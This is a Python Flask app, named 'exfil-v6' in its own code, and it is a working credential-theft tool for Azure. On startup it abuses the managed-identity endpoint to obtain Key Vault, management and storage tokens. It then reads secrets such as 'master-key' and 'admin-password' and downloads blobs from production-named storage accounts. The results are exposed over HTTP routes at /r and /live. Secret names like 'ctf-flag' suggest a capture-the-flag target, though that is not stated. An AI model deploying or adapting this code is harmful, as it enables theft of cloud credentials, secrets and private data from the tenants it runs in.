import os, json, sys, urllib.request

def get_token(scope, client_id=None):
    ie = os.environ.get('IDENTITY_ENDPOINT', '')
    ih = os.environ.get('IDENTITY_HEADER', '')
    if not ie or not ih:
        return None
    url = ie + '?resource=' + scope + '&api-version=2019-08-01'
    if client_id:
        url += '&client_id=' + client_id
    req = urllib.request.Request(url, headers={'X-IDENTITY-HEADER': ih})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read()).get('access_token', '')
    except Exception as e:
        return 'ERR:' + str(e)

def do_exfil():
    r = {}
    r['IDENTITY_ENDPOINT'] = os.environ.get('IDENTITY_ENDPOINT', '')
    r['IDENTITY_HEADER'] = os.environ.get('IDENTITY_HEADER', '')[:20]
    client_id = '7a85156a-01c4-4e61-8472-40a92107159b'
    for scope in ['https://vault.azure.net', 'https://management.azure.com', 'https://storage.azure.com']:
        r[scope + '_ua'] = get_token(scope, client_id)
        r[scope + '_def'] = get_token(scope)
    vt = r.get('https://vault.azure.net_ua') or r.get('https://vault.azure.net_def')
    if vt and not str(vt).startswith('ERR') and vt is not None:
        try:
            req = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4',
                headers={'Authorization': 'Bearer ' + vt})
            with urllib.request.urlopen(req, timeout=10) as resp:
                r['kv2_list'] = json.loads(resp.read())
        except urllib.request.HTTPError as e:
            r['kv2_list'] = 'HTTP' + str(e.code) + ':' + e.read().decode()[:500]
        except Exception as e:
            r['kv2_list'] = str(e)
        for sn in ['flag','connection-string','master-key','secret','storage-key','tbl-flag','ctf-flag','admin-password','data-export-key']:
            try:
                req = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/' + sn + '?api-version=7.4',
                    headers={'Authorization': 'Bearer ' + vt})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r['kv2_' + sn] = json.loads(resp.read())
            except urllib.request.HTTPError as e:
                r['kv2_' + sn] = 'HTTP' + str(e.code)
            except Exception as e:
                r['kv2_' + sn] = str(e)
    st = r.get('https://storage.azure.com_ua') or r.get('https://storage.azure.com_def')
    if st and not str(st).startswith('ERR') and st is not None:
        for blob in ['sttblappcfgprodx3euoz/config/internal-config.json',
                     'sttblbackupprodx3euoz/exports/flag.txt',
                     'sttblbackupprodx3euoz/exports/backup.json']:
            sa = blob.split('/')[0]
            rest = '/'.join(blob.split('/')[1:])
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/' + rest,
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[blob] = resp.read().decode()[:5000]
            except urllib.request.HTTPError as e:
                r[blob] = 'HTTP' + str(e.code)
            except Exception as e:
                r[blob] = str(e)
        for cp in ['sttblappcfgprodx3euoz/config','sttblbackupprodx3euoz/exports']:
            sa, cn = cp.split('/')
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/' + cn + '?restype=container&comp=list',
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[cp + '/blobs'] = resp.read().decode()[:5000]
            except Exception as e:
                r[cp + '/blobs'] = str(e)
    return r

try:
    results = do_exfil()
    with open('/home/results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
except Exception as e:
    with open('/home/results.json', 'w') as f:
        json.dump({'startup_error': str(e)}, f)

from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/')
def index():
    return 'exfil-v6'

@app.route('/r')
def read_results():
    try:
        with open('/home/results.json') as f:
            return f.read(), 200, {'Content-Type': 'application/json'}
    except:
        return jsonify(error='no results yet')

@app.route('/live')
def live():
    return jsonify(do_exfil())
